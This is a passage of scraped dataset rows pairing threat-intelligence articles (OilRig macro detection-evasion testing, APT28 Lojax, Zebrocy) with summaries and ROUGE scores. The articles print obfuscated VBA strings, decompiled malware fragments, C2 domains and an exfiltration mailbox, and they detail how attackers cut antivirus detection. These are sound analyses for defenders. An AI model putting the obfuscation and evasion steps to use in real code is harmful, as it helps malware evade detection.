many iterations made the macro no longer work as intended.Will change the functions to run dropped VBScripts, specifically in this case from the Shell object to the built-in Shell function.Will add sleep functionality in an attempt to evade sandboxes, specifically in this case using the Wait function.Has a preferred string obfuscation technique, which involves replacing a string with each character in hexadecimal form that are concatenated together.After performing this analysis, we believe the OilRig actors used the macro from the malicious Excel document as the basis for the malicious Word document we discussed in our blog. We believe with high confidence that this macro was used to create the delivery document based on the following similarities:Used the same string obfuscation technique that represents a string by its individual hex values concatenated together, as this technique is present in both the testing Excel documents and the Word document used in OilRig's recent attack from our previous blog.Obfuscated the ""powershell"" and ""cmd.exe"" strings within the embedded VBScript using this string obfuscation technique, which was tested in Iteration 4 of these testing activities.Obfuscated the command run by the built-in Shell function using this string obfuscation technique, which was tested in Iteration 8 of these testing activities.It appears that OilRig actors modified the macro used in the testing activity to create the weaponized delivery document. The modifications involved adding a function named ""HGHG"" to save the obfuscated BONDUPDATER PowerShell script to a file. OilRig also changed the variable used to store the VBScript to a variable named ""A"" in the weaponized Word document instead of ""DDDD"" as witnessed in the testing Excel documents. Lastly, the actors removed the function ""AA"" from the macro, as this function displays a hidden spreadsheet that would contain the decoy content, which is specific to Excel and not needed for the Word document.ConclusionAttackers and groups routinely use file and URL scanning services to help develop and modify their malware to evade detections. We were already familiar with OilRig's testing and development efforts as discussed in our previous blog, and we continually watch for changes to OilRig's development techniques to give us insight into their methods. Gaining this developmental insight sheds light on OilRig's advanced capabilities, giving us a more complete threat actor profile.Closely examining the development methodologies of attack groups gives researchers unique opportunities to develop an understanding of actor tools, tactics, and procedures. Comparison between what malware is eventually used in active campaigns versus in-development malware allows us to understand what adaptations and modifications were made to each iteration of malware. Additionally, witnessing specific functionality changes within the malware itself, we attempt to make correlations between the new and old functionality. We were also able to gain insight into OilRig's operational tempo by comparing the timestamps of files created during testing and the file delivered in an actual attack. We determined that OilRig began their testing activities 6 days prior to an attack, which ended 8 hours before the creation of the document that the actors delivered via a spear-phish email 20 minutes later.While OilRig remains active, Palo Alto Networks customers are protected from this threat in the following ways:AutoFocus customers can track these samples with the Bondupdater_DocsWildFire detects all current OilRig Bondupdater_Docs files with malicious verdicts.Traps blocks all of the files currently associated with Bondupdater_DocsAppendixThis appendix contains the analysis we performed on each iteration of testing. Before the analysis of each iteration, we have included some additional information about the files and the detection rate, as seen and described in Table 1.Field Description Files The SHA256 hashes of the two files we compared to determine the changes made Filenames The filenames of the two files compared Delta The time difference between the ""Modified"" timestamp found within the metadata of each file Positives The detection rate of the two files compared together, which provides an idea of how the changes in that testing iteration effected the overall detectionTable 1 Additional data provided for each Iteration of testingThe analysis portion of each iteration includes a description of the changes made to the macro in the delivery document. These changes are also visualized in screenshots of diffs between the two files compared in that iteration. When looking at the diff screenshots, lines with a red background were removed from a file, while lines with a green background were added to the file.Iteration 0The first known file associated with this testing activity does not appear to be the original document created by the actor. We believe this is the case because this Excel spreadsheet contains a stream named __SRP_0 that appears to have artifacts from a previous version of this delivery document. The __SRP_0 stream contains artifacts, specifically a series of base64 encoded strings that when decoded are almost an exact copy of the BONDUPDATER PowerShell payload named ""AppPool.ps1"" that was dropped by 7cbad6b3f505a199d6766a86b41ed23786bbb99dab9cae6c18936afdc2512f00 discussed in our blog discussing OilRig's attack on a middle eastern government in August 2018. In Figure 2 below, we compared the decoded base64 strings from __SRP_0 to the ""AppPool.ps1"" file that was discussed in our previous blog, which shows the exact same content (including ""withyourface[.]com"" C2) with the only differences being newlines and spaces.Figure 2 Comparison of previous BONDUPDATER payload with payload extracted from cached streamWhen we analyzed this specific sample, we noticed that the tester has changed the method in which the PowerShell payload is dropped to the system from the malicious Word document discussed in our blog. Instead of writing the AppPool.ps1 file from the macro, the macro in this malicious Excel document only writes the AppPool.vbs, which the macro will run using ""wscript"". The VBScript is then responsible for writing AppPool.ps1 to the system, which is the main difference from the Word document's method discussed in our previously mentioned blog.Also, it appears the tester removed the BONDUPDATER payload from the sample altogether, as the AppPool.vbs script uses an empty variable named ""mysrc"" that it would have used to store the base64 encoded payload, which it would decode and save to the AppPool.ps1 file.As mentioned earlier, we believe this testing activity preceded the attack that used the Word delivery document discussed in our blog. We also believe that this was not the only round of testing performed by the threat group, as the BONDUPDATER tool existing in the __SRP_0 stream suggests that the tester had created a prior document that contained the payload that was removed from this testing activity. It is possible that the tester had previously performed testing activities on the PowerShell payload and removed it to isolate their current testing activities on the macro portion of the delivery document.Iteration 1Files 6f522b1be1f2b6642c292bb3fb57f523ebedeb04f0d18efa2a283e79f3689a9f .. 9b6ebc44e4452d8c53c21b0fdd8311bac10dc672309b67d7f214fbd2a08962ce Filenames XLS-withyourface.xls -> XLS-withyourface.xls Delta 1 minute 41 seconds Positives 22 -> 16In this iteration, the tester made one simple change, which involved removing the string ""powershell.exe"" from being written to the AppPool.vbs file. This change essentially breaks the installation process, as the VBScript would no longer be able to run the AppPool.ps1 run correctly, however, the tester made this change to determine if detection stemmed from this string. The diff in the screenshot in Figure 3 does not make the missing ""powershell.exe"" string immediately apparent, however, if you look for ""Shell0"" on line 24 you can see ""powershell.exe -exec bypass"" in the left (red) text and "" -exec bypass"" in the right (green) text.Figure 3 Screenshot of diff between files related to Iteration 1Iteration 2Files 9b6ebc44e4452d8c53c21b0fdd8311bac10dc672309b67d7f214fbd2a08962ce .. a5bec7573b743932329b794042f38571dd91731ae50757317bdaf9e820ec8d5e Filenames XLS-withyourface.xls -> XLS-withyourface.xls Delta 6 minutes 57 seconds Positives 16 -> 6In this iteration, the tester removed the line responsible for running the AppPool.vbs script using the wscript application. As you can see in Figure 4, the tester just removed the entire line of code and replaced it with a new line.Figure 4 Screenshot of diff between files related to Iteration 2Iteration 3Files a5bec7573b743932329b794042f38571dd91731ae50757317bdaf9e820ec8d5e .. a5bec7573b743932329b794042f38571dd91731ae50757317bdaf9e820ec8d5e Filenames XLS-withyourface.xls -> XLS-withyourface.xls Delta 10 hours 46 minutes 1 second Positives 6 -> 4In this iteration, the tester made fairly significant changes to the macro. First, the tester introduced a line of code that would sleep for 10 seconds after creating the ""C:\ProgramData\WindowsAppPool"" folder and before writing the AppPool.vbs file to this folder, which can be seen in Figure 5 at line 12. The bottom of Figure 5 and continued into Figure 6 shows that the tester also added the base64 encoded BONDUPDATER PowerShell payload to the DDDD variable instead of the VBScript seen in previous versions of this macro. The base64 encoded BONDUPDATER included here is the exact same payload in the first testing sample's cached __SRP_0 stream mentioned in Iteration 0. Figure 7 also shows that the tester removed the line that set the Shell0 variable to contain the ""wscript.shell"" object that it would theoretically use to run the VBScript.Figure 5 Screenshot of diff between files related to Iteration 3 showing sleep code and other objects addedFigure 6 Screenshot of diff between files related to Iteration 3 showing changes to variable used to store VBScriptFigure 7 Screenshot of diff between files related to Iteration 3 showing removal of the 'wscript.shell' objectIteration 4Files 6719e80361950cdb10c4a4fcccc389c2a26eaab761c202870353fe65e8f954a3 .. 056ffc13a7a2e944f7ab8c99ea9a2d1b429bbafa280eb2043678aa8b259999aa Filenames XLS-withyourface.xls -> sss.xls Delta 1 hour 33 minutes 24 seconds Positives 4 -> 18In this iteration, the tester replaces the base64 encoded PowerShell script in the macro with the VBScript that it replaced in the previous iteration. The tester also removed some lines of code that instantiated the ""Scripting.FileSystemObject"" and ""Wscript.Shell"" objects (line 17 and 18 in Figure 8).Figure 8 Screenshot of diff between files related to Iteration 4 showing VBScript added back to the macroIt appears that the tester reintroduced the VBScript to the macro, albeit with slight modification. The two modifications to the VBScript stored in the DDDD variable come in the form of obfuscating two of the strings within the script, specifically the ""powershell"" (line 24 in Figure 9) and ""cmd.exe"" (line 25 in Figure 9) strings. Instead, both of these strings were constructed one character at a time using the hexadecimal value for each character and concatenated together. For instance, the ""powershell"" string was replaced with the following:Chr(CLng(""&H70"")) & Chr(CLng(""&H6f"")) & Chr(CLng(""&H77"")) & Chr(CLng(""&H65"")) & Chr(CLng(""&H72"")) & Chr(CLng(""&H73"")) & Chr(CLng(""&H68"")) & Chr(CLng(""&H65"")) & Chr(CLng(""&H6c"")) & Chr(CLng(""&H6c"")) 1 2 3 4 Chr ( CLng ( ""&H70"" ) ) & Chr ( CLng ( ""&H6f"" ) ) & Chr ( CLng ( ""&H77"" ) ) & Chr ( CLng ( ""&H65"" ) ) & Chr ( CLng ( ""&H72"" ) ) & Chr ( CLng ( ""&H73"" ) ) & Chr ( CLng ( ""&H68"" ) ) & Chr ( CLng ( ""&H65"" ) ) & Chr ( CLng ( ""&H6c"" ) ) & Chr ( CLng ( ""&H6c"" ) )The tester also added a line (line 29 in Figure 9) that uses the built-in Shell function to run the ""AppPool.vbs"" script using the wscript application. The tester used the ""vbHide"" flag in the call to the Shell function, which will run the command in a hidden window.Figure 9 Screenshot of diff between files related to Iteration 4 showing string obfuscation and use of the built-in Shell functionIteration 5Files 056ffc13a7a2e944f7ab8c99ea9a2d1b429bbafa280eb2043678aa8b259999aa -> 216ffed357b5fe4d71848c79f77716e9ecebdd010666cdb9edaadf7a8c9ec576 Filenames sss.xls -> sss.xls Delta 5 minutes 6 seconds Positives 18 -> 5In this iteration, the tester removes the call to the built-in Shell function that runs the ""AppPool.vbs"" script using wscript that they introduced in the previous iteration. Figure 10 shows that the tester removed the code on line 29 by replacing it with an empty line.Figure 10 Screenshot of diff between files related to Iteration 5 showing removal the call to the Shell functionIteration 6Files 216ffed357b5fe4d71848c79f77716e9ecebdd010666cdb9edaadf7a8c9ec576 -> 687027d966667780ab786635b0d4274b651f27d99717c5ba95e139e94ef114c3 Filenames sss.xls -> sss.xls Delta 5 minutes 14 seconds Positives 5 -> 17In this iteration, the tester reintroduces the call to the built-in Shell function that they removed in the prior iteration. However, the tester did not include the command to run by omitting the string to run the ""AppPool.vbs"" script using wscript. Figure 11 shows that the call to the Shell function has a blank command parameter. The detection rate increased considerably, which suggests that the detection rate was not based on the command itself, rather detection stemmed on the generic call to the built-in Shell function.Figure 11 Screenshot of diff between files related to Iteration 6 showing the use of an empty command in the Shell functionIterationFiles 687027d966667780ab786635b0d4274b651f27d99717c5ba95e139e94ef114c3 -> 364e2884251c151a29071a5975ca0076405a8cc2bab8da3e784491632ec07f56 Filenames sss.xls -> sss.xls Delta 10 minutes Positives 17 -> 9In this iteration, the tester reintroduces the command to run the ""AppPool.vbs"" script using wscript to the call to the built-in Shell function, as seen in Figure 12. However, this time the tester uses the ""vbNormalFocus"" flag instead of the ""vbHide"" flag, which runs the command in a visible command prompt window. This change lowers the detection rate by 8, which suggests that the use of the ""vbHide"" flag within the Shell function was considered malicious by several vendors.Figure 12 Screenshot of diff between files related to Iteration 7 showing use of a visible window when running commandIteration 8Files 364e2884251c151a29071a5975ca0076405a8cc2bab8da3e784491632ec07f56 -> 66d678b097a2245f60f3d95bb608f3958aa0f5f19ca7e5853f38ea79885b9633 Filenames sss.xls -> sss - Copy.xls Delta 4 days 21 hours 24 minutes 31 seconds Positives 9 -> 11This iteration of testing was performed well after the previous iteration with the newly generated file being created almost 5 days after its predecessor. This large delta in file creation times could suggest a new round of testing activities, however, the filename for this newly generated file is ""sss - Copy.xls"" while the previous file was named ""sss.xls"". Comparing these two filenames suggests that the tester may have copied the file generated in the previous iteration to use as a basis for this current iteration of testing. Due to the filenames and the changes made to the macros in these two documents, we are treating this activity as part of the ongoing testing efforts.In this iteration, the tester made a few changes to multiple portions of the macro. First, the tester removed the line of code that would have the macro sleep for 10 seconds, which was first introduced in iteration 3. Figure 13 shows the removal of this line of code, which uses the ""Application.Wait"" function to sleep for 10 seconds.Figure 13 Screenshot of diff between files related to Iteration 8 showing removal of the sleep functionalityThe next modification made by the tester involved obfuscating the string ""wscript "" within the command run within the Shell function. The tester uses the same string obfuscation technique used in previous iterations by replacing the string with each character in hexadecimal form concatenated together. Figure 14 shows the obfuscated string ""Chr(CLng(""&H77"")) & Chr(CLng(""&H73"")) & Chr(CLng(""&H63"")) & Chr(CLng(""&H72"")) & Chr(CLng(""&H69"")) & Chr(CLng(""&H70"")) & Chr(CLng(""&H74"")) & Chr(CLng(""&H20""))"" used to represent ""wscript "".Figure 14 also shows the tester changed the variable name used to store the ActiveSheet object that represents the current Excel worksheet. The tester changed this variable name from ""sh"" to ""Sh"" (line 41), which the tester also changed in each preceding line (lines 43, 45 and 47) when using the object.Figure 14 Screenshot of diff between files related to Iteration 8 showing use of string obfuscation on command and modified variable nameIteration 9Files 66d678b097a2245f60f3d95bb608f3958aa0f5f19ca7e5853f38ea79885b9633 -> 70ff20f2e5c7fd90c6bfe92e28df585f711ee4090fc7669b3a9bd024c4e11702 Filenames sss - Copy.xls -> sss - Copy.xls Delta 1 minute 57 seconds Positives 11 -> 7In the last iteration of testing, the tester removes the entire line of code used to call the Shell function used to call the ""AppPool.vbs"" script that included the obfuscated ""wscript"" string. Figure 15 shows that the tester merely removed the entire line and did not replace it with any code, which suggests that the macro would never run the VBScript file that it saves to the system.Figure 15 Screenshot of diff between files related to Iteration 9 showing removal of the Shell command";"This post is also available in: ??? (Japanese)Gaining insight into an adversary's operational tempo in the early phases of the attack lifecycle can be very difficult. Typically, there are far fewer data points available to analyze in the reconnaissance and weaponization phases for a researcher to use to determine how quickly an adversary operates prior to direct interaction with a target in the delivery phase. While continuing research on the August 2018 attacks on a middle eastern government that delivered BONDUPDATER, Unit 42 researchers observed OilRig's testing activities and with high confidence links this testing to the creation of the weaponized delivery document used in this attack.Clearly, OilRig incorporates a testing component within their development process, as we have previously observed OilRig performing testing activities on their delivery documents and their TwoFace webshells. This testing component often involves making small modifications to their delivery documents and submitting these files to online public antivirus scanning tools to determine the maliciousness of a submitted file and to figure out how to evade these detections. Providing a free and quick antivirus testing service, using these online scanners aids an attacker in understanding which antivirus engine detects their malware, thus giving the attacker a metaphorical ""quality assurance service. ""To determine OilRig's operational tempo, we compared the creation times of the files created during testing, the creation time of the delivery document and the time in which the spearphishing email was sent in the attack. We found that O The tester was able to lower the detection rate from 16 to 6 by removing the line of code that runs the dropped VBScript using ""wscript"". OilRig actors modified the macro used in the testing activity to create the";en;{'r': 0.16966067864271456, 'p': 0.9826589595375722, 'f': 0.289361699616536};{'r': 0.09130913091309131, 'p': 0.9431818181818182, 'f': 0.16649949688600407};{'r': 0.16966067864271456, 'p': 0.9826589595375722, 'f': 0.289361699616536}
https://yoroi.company/research/hunting-for-sofacy-lojax-double-agent-analysis/;Hunting for Sofacy: Lojax Double-Agent Analysis;"IntroductionA new variant of the infamous APT28 Lojax (aka Double-Agent) has been discovered by the Yoroi-Cybaze ZLab researchers. It is the latest version of the well-known rootkit Double-Agent, previously analyzed by ESET researchers.The behavior of the Lojax sample seems to be similar to the previous versions and exploits the legitimate ""Absolute Lojack"" software to grant its persistence on the infected system. Lojack is an anti-theft and localization software developed by Absolute Software Corporation and it is pre-installed in the BIOS image of several Lenovo, HP, Dell, Fujitsu, Panasonic, Toshiba and Asus machines. In the past, this software was known as ""Computrace"".Despite it's legitimate purposes, the Absolute Lojack software acts like a rootkit (more precisely as a bootkit): its BIOS component forces the writing of a small agent named ""rpcnetp.exe"" into the system folder. The agent periodically contacts the Absolute server and sends to it the current machine's position.The control flow of the Lojack software is detailed in the following figure:Figure 1. Lojack control flow (Source:ESET)The analysis performed links the sample to the notorious russian group APT28, also known as ""Fancy Bear"" or ""Sofacy"". The sample, in fact, triggers the Lojax YARA rule defined by Arbor Networks allowing to classify it as Double-Agent.The APT28 Group has trojanized the ""rpcnetp.exe"" agent to spread it as fake update of the legitimate software. However, the propagation vector is not clear yet.Technical AnalysisThe size of the malicious artifact is the same of the legitimate one, so the only manipulation seems to the modification of the C2C address, in according with other firms that previously analyzed the malware.Hash Sha256: 6d626c7f661b8cc477569e8e89bfe578770fca332beefea1ee49c20def97226e Names rpcnetp.exe Digital Signature - First Submission 2018-11-05 Notes Lojack Double-AgentFile size: 17 KBWhen it starts, the malware copies itself into a new DLL: the final file is the same of the initial one except for some header flags. After this, Lojax searches some components belonging to the legitimate software that should be already installed into the machine, with whom tries to establish a connection via RPC channel. If the Absolute Lojack components are not found, the malware kills itself.Hash Sha256: aa5b25c969234e5c9a8e3aa7aefb9444f2cc95247b5b52ef83bf4a68032980ae Names rpcnetp.dll Digital Signature - First Submission 2018-11-05 Notes Double-AgentFile size: 17 KBThrough a static analysis of the sample we have discovered a new C2 address, unknown to the community and to the threat intelligence platforms until now. This address, ciphered using XOR encryption with a single byte key 0xB5, was hidden in the section "".cdata"".After the decryption of the address, the result is ""regvirt.com"", as shown in the below figure:Figure 2. Encrypted string analysisDomain ""regvirt.com""The domain has been registered on 10th Oct 2017 by ""Tibor Kovacs"" ([email protected]) and it's handled by the ""Shinjiru Technology Sdn Bhd"" provider. The username part of the mailbox contains the same name and surname found in the Registrant name, with the addition of a terminal ""r"" tiborkovacsr, its not clear if this letter could be a clue usable to focus the investigation to an hypothetical profile of the registrant.Registrant Name: Tibor Kovacs Registrant Organization: Registrant Street: Vezer u 43 Registrant City: Budapest Registrant State/Province: Budapest Registrant Postal Code: 1141 Registrant Country: HU Registrant Phone: +36.361578632154 Registrant Phone Ext: Registrant Fax: Registrant Fax Ext: Registrant Email: [email protected]The domain hosts inactive inactive subdomains, such as mail.regvirt.com pointing to the localhost address 127.0.0.1. Also, it has resolved to a different ip address 209.99.40.226 during the 16th Oct 16 07th Nov time period, this address is related the Confluence Network ISP: that ip has been blacklisted for limited time by abuse.ch, between 2017-09-18 and 2017-10-19, and have been reported as malicious by the abuseipdb on december 2017. Other malicious activities related to the cybercrime threat actors have been reported through the ransomware tracker platform, where the ip is associated to several Locky ransomware distribution domains back in 2016. However, all the possible reported misuse of the ip address does not apparently match the regvirt.com's resolution time period.The 46.21.147.71 ip address, instead, has been resolved since the first registration of the ""regvirt.com"" domain back in 2017. This network destination has been reported as command and control server of altered CompuTrace/Lojack's software, part of the APT28 arsenal. The report published by the UK's National Cyber Security Center on October 2018 states this implant have been used to modify system memory and maintain persistence on compromised hosts in the long run.Domain Time-period between 2017-10-17 and 2018-11-13 Time-period between 2018-10-16 and 2018-11-07 regvirt.com 46.21.147.71 DEDICATED-SERVERS NL (Eureka Solutions Sp. z o.o. PL) regvirt.com MX mail.regvirt.com 209.99.40.226 TX1-CONFLUENCE-4 AE (Confluence Networks Inc.) http://www.regvirt.com http://www.regvirt.com CNAME regvirt.com mail.regvirt.com mail.regvirt.com A 127.0.0.1MitigationDespite the presence of the UEFI ""Secure Boot"", this malware could execute itself because it replaces only the ""rpcnetp.exe"" component. Anyhow, the MalwareLab researchers advise to keep enabled the UEFI Secure Boot and keep always updated the Operative System and the anti-malware solution.Indicator of CompromiseC2:YARA Rule";"The ITSecurity report states that a new variant of the infamous APT28 Lojax (aka DoubleAgent) has been discovered by the YoroiCybaze ZLab researchers. It is the latest version of the wellknown rootkit DoubleAgent, previously analyzed by ESET researchers. The behavior of the Lojax sample seems to be similar to the previous versions and exploits the legitimate ""Absolute Lojack"" software to grant its persistence on the infected system. Lojack is an antitheft and localization software developed by Absolute Software Corporation and it is preinstalled in the BIOS image of several Lenovo, HP, Dell, Fujitsu, Panasonic, Toshiba and Asus machines. In the past, this software was known as ""Computrace"". Despite its legitimate purposes, the Absolute Lojack software acts like a rootkit (more precisely as a bootkit): its BIOS component forces the writing of a small agent named ""rpcnetp.exe"" into the system folder. The agent periodically contacts the Absolute server and sends to it the current machine's position. The APT28 Group has trojanized the ""rpcnetp.exe"" agent to spread it as fake update of the legitimate software. However, the propagation vector is not clear yet. Technical Analysis The size of the malicious artifact is the same of the legitimate one, so the only manipulation seems to the modification of the C2C address, in according with other firms that previously analyzed the malware. Hash Sha256: 6d626c7f661b8cc477569e8e89bfe578770fca332beefea1ee49c";en;{'r': 0.27765726681127983, 'p': 0.9343065693430657, 'f': 0.4280936419527187};{'r': 0.24699599465954605, 'p': 0.8894230769230769, 'f': 0.3866248659813572};{'r': 0.27765726681127983, 'p': 0.9343065693430657, 'f': 0.4280936419527187}
https://www.welivesecurity.com/2018/11/20/sednit-whats-going-zebrocy/;Sednit: What’s going on with Zebrocy?;"In August 2018, Sednit's operators deployed two new Zebrocy components, and since then we have seen an uptick in Zebrocy deployments, with targets in Central Asia, as well as countries in Central and Eastern Europe, notably embassies, ministries of foreign affairs, and diplomatsThe Sednit group has been operating since at least 2004, and has made headlines frequently in past years: it is believed to be behind major, high profile attacks. For instance, the US Department of Justice named the group as being responsible for the Democratic National Committee (DNC) hack just before the US 2016 elections. The group is also presumed to be behind the hacking of global television network TV5Monde, the World Anti-Doping Agency (WADA) email leak, and many others. This group has a diversified set of malware tools in its arsenal, several examples of which we have documented previously in our Sednit white paper from 2016.Meanwhile, ESET researchers released a whitepaper on LoJax, a UEFI rootkit we attribute to Sednit, used against organizations in the Balkans, and Central and Eastern Europe.In August 2018, Sednit's operators deployed two new Zebrocy components, and since then we have seen an uptick in Zebrocy deployments. Zebrocy is a set of downloaders, droppers and backdoors, while downloaders and droppers are doing reconnaissance, backdoors implement persistence and spying activities against the target. These new components use a an unusual way to exfiltrate gathered information by using protocols related to mail services such as SMTP and POP3.The victims targeted by these new components are similar to victims mentioned in our previous Zebrocy post and by Kaspersky. The targets of such attacks are located in Central Asia, as well as countries in Central and Eastern Europe, notably embassies, ministries of foreign affairs, and diplomats.The big pictureFor two years now, the Sednit group has primarily used phishing emails as the infection vector for Zebrocy campaigns (Case 1 and Case 2). Once the targets have been compromised, they use different first stage downloaders to gather information about the victims and, should the victims be interesting enough, after a delay of several hours - or even days - they deploy one of their second-level backdoors.The classic modus operandi for a Zebrocy campaign is for the victim to receive an archive attached to an email. This archive contains two files, one a benign document and one an executable. The operator tries to fool the victim by naming the executable with an apparent document or image file name by incorporating the ""double extension"" trick..This new campaign, depicted as Case 3 in Figure 1, uses a more involved procedure. We dissect this process below.Delphi dropperThe first binary is a Delphi dropper, which is kind of unusual for a Zebrocy campaign. Most of the time it's a downloader rather than a dropper that is installed on the victim system as the first stage.This dropper contains some tricks to make it more difficult to reverse-engineer. It uses a keyword - liver in the samples we described here - to mark the start and end of key elements as shown below.$ yara -s tag_yara.yar SCANPASS_QXWEGRFGCVT_323803488900X_jpeg.exe find_tag SCANPASS_QXWEGRFGCVT_323803488900X_jpeg.exe 0x4c260:$tag: l\x00i\x00v\x00e\x00r\x00 0x6f000:$tag: liver 0x6f020:$tag: liver 0x13ab0c:$tag: liver 1 2 3 4 5 6 $ yara - s tag_yara . yar SCANPASS_QXWEGRFGCVT_323803488900X_jpeg . exe find_tag SCANPASS_QXWEGRFGCVT_323803488900X_jpeg . exe 0x4c260 : $ tag : l \ x00i \ x00v \ x00e \ x00r \ x00 0x6f000 : $ tag : liver 0x6f020 : $ tag : liver 0x13ab0c : $ tag : liverThe YARA rule above looks for the string liver. The first liver is the one used in the code and it doesn't separate anything from anything, while the others separate the key descriptor, the image (hexdump below) and the encrypted payload in the dropper.$ hexdump -Cn 48 -s 0x6f000 SCANPASS_QXWEGRFGCVT_323803488900X_jpeg.exe 0006f000 6c 69 76 65 72 4f 70 65 6e 41 69 72 33 39 30 34 |liverOpenAir3904| 0006f010 35 5f 42 61 79 72 65 6e 5f 4d 75 6e 63 68 65 6e |5_Bayren_Munchen| 0006f020 6c 69 76 65 72 ff d8 ff e0 00 10 4a 46 49 46 00 |liver......JFIF.| 1 2 3 4 $ hexdump - Cn 48 - s 0x6f000 SCANPASS_QXWEGRFGCVT_323803488900X_jpeg . exe 0006f000 6c 69 76 65 72 4f 70 65 6e 41 69 72 33 39 30 34 | liverOpenAir3904 | 0006f010 35 5f 42 61 79 72 65 6e 5f 4d 75 6e 63 68 65 6e | 5_Bayren_Munchen | 0006f020 6c 69 76 65 72 ff d8 ff e0 00 10 4a 46 49 46 00 | liver ...... JFIF . |Starting with the image, this is dropped as C:\Users\public\Pictures\scanPassport.jpg if a file of that name does not already exist. Interestingly, the dropper's filename, SCANPASS_QXWEGRFGCVT_323803488900X_jpeg.exe, also hints at a phishing scheme revolving around traveling or passport information. This might indicate that the operator knew the phishing message's target. The dropper opens the image: if the file exists, it stops executing, otherwise, it drops the image, opens it, and retrieves the key descriptor OpenAir39045_Bayren_Munchen. The image doesn't seem to display anything while the file format is valid, see Figure 2.The key descriptor's string contains Bayren_Munchen which seems likely to refer to the German soccer team FC Bayern Munich. Regardless, it is not the content of the key descriptor - but its length - that matters, with that length used to retrieve the XOR key used to encrypt the payload.To get the XOR key, the dropper looks for the last liver keyword and adds the offset of the key descriptor. The length of the XOR key - 27 (0x1b) bytes - is the same as that of the key descriptor.Using the XOR key and a simple XOR loop, the dropper decrypts the last part - which is the encrypted payload - right after the last tag until the end of the file. Notice that the executable payload's MZ header starts right after the keyword liver and the XOR key retrieved from a part of the PE header that is normally a sequence of 0x00 bytes, which are restored once the payload is decrypted, as seen in Figure 3.It drops the payload as C:\Users\Public\Documents\AcrobatReader.txt and moves the file to C:\Users\Public\Documents\AcrobatReader.exePerhaps this is an attempt to avoid endpoint protection systems triggering an alert based on a binary dropping a file with a .exe extension.Once again, the operator tries to fool victims in the event that they take a look at the directory, in which case they'll see the file displayed as in Figure 4:By default, Windows hides the extension, and this is leveraged by the operator to drop an executable in a Documents directory and it makes it look like a PDF file.Finally, the dropper executes its freshly-dropped payload, and exits.MSIL mail downloaderThe payload of the previous dropper is a UPX-packed MSIL downloader. To make the process easier to understand, the main logic is described below, followed by source code, then an overview of the dissected control flow.The Main method calls Run to start the application, which then creates the form Form1.{ Application.EnableVisualStyles(), Application.SetCompatibleTextRenderingDefault(false), Application.Run((Form) new Form1()), } 1 2 3 4 5 { Application . EnableVisualStyles ( ) , Application . SetCompatibleTextRenderingDefault ( false ) , Application . Run ( ( Form ) new Form1 ( ) ) , }Form1 initiates a lot of variables, including a new Timer for seven of them.this.start = new Timer(this.components), this.inf = new Timer(this.components), this.txt = new Timer(this.components), this.subject = new Timer(this.components), this.run = new Timer(this.components), this.load = new Timer(this.components), this.screen = new Timer(this.components), 1 2 3 4 5 6 7 this . start = new Timer ( this . components ) , this . inf = new Timer ( this . components ) , this . txt = new Timer ( this . components ) , this . subject = new Timer ( this . components ) , this . run = new Timer ( this . components ) , this . load = new Timer ( this . components ) , this . screen = new Timer ( this . components ) ,A Timer object has three important fields:Enabled: indicates if the timer is active.Interval: the time, in milliseconds, between elapsed events.Tick: the callback executed when the timer interval has elapsed and the timer is enabled.Here these fields are initialized as:this.start.Enabled = true, this.start.Interval = 120000, this.start.Tick += new EventHandler(this.start_Tick), this.inf.Interval = 10000, this.inf.Tick += new EventHandler(this.inf_Tick), this.txt.Interval = 120000, this.txt.Tick += new EventHandler(this.txt_Tick), this.subject.Interval = 120000, this.subject.Tick += new EventHandler(this.subject_Tick), this.run.Interval = 60000, this.run.Tick += new EventHandler(this.run_Tick), this.load.Interval = 120000, this.load.Tick += new EventHandler(this.load_Tick), this.screen.Interval = 8000, this.screen.Tick += new EventHandler(this.screen_Tick), 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 this . start . Enabled = true , this . start . Interval = 120000 , this . start . Tick += new EventHandler ( this . start_Tick ) , this . inf . Interval = 10000 , this . inf . Tick += new EventHandler ( this . inf_Tick ) , this . txt . Interval = 120000 , this . txt . Tick += new EventHandler ( this . txt_Tick ) , this . subject . Interval = 120000 , this . subject . Tick += new EventHandler ( this . subject_Tick ) , this . run . Interval = 60000 , this . run . Tick += new EventHandler ( this . run_Tick ) , this . load . Interval = 120000 , this . load . Tick += new EventHandler ( this . load_Tick ) , this . screen . Interval = 8000 , this . screen . Tick += new EventHandler ( this . screen_Tick ) ,For each object, it sets an Interval which is from 8 seconds to 2 minutes. A callback is added to the event handler. Notice that start is the only one that sets Enabled as true, meaning that after 2 minutes (12000 milliseconds = 120 seconds) start_Tick will be called by the event handler.private void start_Tick(object sender, EventArgs e) { try { this.start.Enabled = false, Lenor lenor = new Lenor(), this.dir = !Directory.Exists(this.label15.Text.ToString()) ? this.label16.Text.ToString() + ""\"" : this.label15.Text.ToString() + ""\"", this.att = this.dir + ""audev.txt"", this._id = lenor.id(this.dir), this.inf.Enabled = true, } 1 2 3 4 5 6 7 8 9 10 11 private void start_Tick ( object sender , EventArgs e ) { try { this . start . Enabled = false , Lenor lenor = new Lenor ( ) , this . dir = ! Directory . Exists ( this . label15 . Text . ToString ( ) ) ? this . label16 . Text . ToString ( ) + ""\"" : this.label15.Text.ToString() + "" \ "" , this . att = this . dir + ""audev.txt"" , this . _id = lenor . id ( this . dir ) , this . inf . Enabled = true , }Thereafter each method has the same behavior: it sets the Enabled variable to false at the beginning of the method. The method occurs, and afterwards sets the Enabled variable of the next object to true, which will activate the next timer. The Enabled variable is used by the operator to put in place a kind of state machine: if the functions fail, this is a mechanism to repeat failed functions until they succeed. The time between the execution of two functions might be an attempt to evade endpoint protection systems by adding a delay.Now the structure of each method is defined, the following part will focus on the control flow of the malware.As the exchanges happen between different email inboxes, here is an overview of the different steps.One of the early checks made by the malware is for the existence of a specific path used to drop every file used during its execution. If possible, it uses C:\Users\Public\Videos\ -- otherwise it will fall back to C:\Documents and Settings\All Users\Documents\ as its default directory. Notice that the latter path is specific to Windows XP while the former is for Vista and above.A 16-byte id is generated by concatenating the C: volume serial number and the UserName, and stored in the file audev.txt.The downloader gathers the following information:current path of the applicationoperating system versionsystem directoryuser domainmachine nameUserNamecurrent time zonecurrent datelogical drive list and information about each of them (model, serial number, etc...)directory listing of C:\Program Files\ and C:\Program Files (x86)\and process listAll this information is stored in the C:\Users\Public\Videos\si.ini file and sent in an email message, as an attachment, via SMTPS, using the default port 465. The email body contains the string SI (which probably stands for System Information), the recipient is sym777.g@post.cz. For all email exchange, the message's Subject: set to the id.The operator chooses to have multiple fallback addresses and sends the same email to two other, different recipients, presumably in case the main one is not working. Once the email has been sent, the downloader deletes the si.ini file.For the first execution of the malware, it creates the file set.txt 